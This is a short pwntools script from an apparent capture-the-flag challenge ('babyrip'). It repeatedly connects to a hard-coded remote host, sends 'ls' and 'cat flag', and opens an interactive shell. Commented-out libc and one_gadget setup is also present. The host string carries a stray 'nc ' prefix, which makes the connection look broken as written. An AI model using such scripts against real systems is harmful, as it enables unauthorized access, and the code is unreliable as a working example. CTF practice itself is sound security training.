#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/22 15:02:12
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
# if debug:
#     if context.arch == "amd64":
#         sh = process(["./babyrip"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
#         #sh = process('./')
#         libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#         #libc = ELF("../../libc_file/16-64-libc-2.23.so")
#         one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
#     else:
#         sh = process(["./babyrip"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
#         #sh = process("./")
#         libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#         libc = ELF("../../libc_file/16-32-libc-2.23.so")
# else:
#     IP = 'nc 82.156.230.195'
#     port = 32768
#     sh = remote(IP,port)
#     libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
# def debug():
#     gdb.attach(sh)
#     pause()
i = 0
while True:
    try:
        sh = remote("nc 114.116.54.89",10001)
        sh.sendline("ls")
        sh.sendline("cat flag")
        sh.interactive()
        pause()
    except:
        i = i + 1
        log.info("times=>%d",i)